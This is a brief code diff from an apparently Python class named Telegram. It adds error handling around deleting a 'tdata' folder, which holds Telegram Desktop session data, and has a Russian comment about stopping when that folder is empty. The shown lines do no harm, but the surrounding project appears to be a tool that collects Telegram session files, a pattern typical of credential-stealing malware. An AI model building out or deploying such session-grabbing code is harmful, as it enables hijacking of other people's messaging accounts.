@@ -166,7 +166,9 @@ class Telegram:
 			except: pass
 		
 		if os.listdir(tg_path) == []:  # если нет данных в папке tdata завершит работу
-			shutil.rmtree(tg_path)
+			try:
+				shutil.rmtree(tg_path)
+			except: pass
 			Support.send_error("Telegram")
 			return False
 			
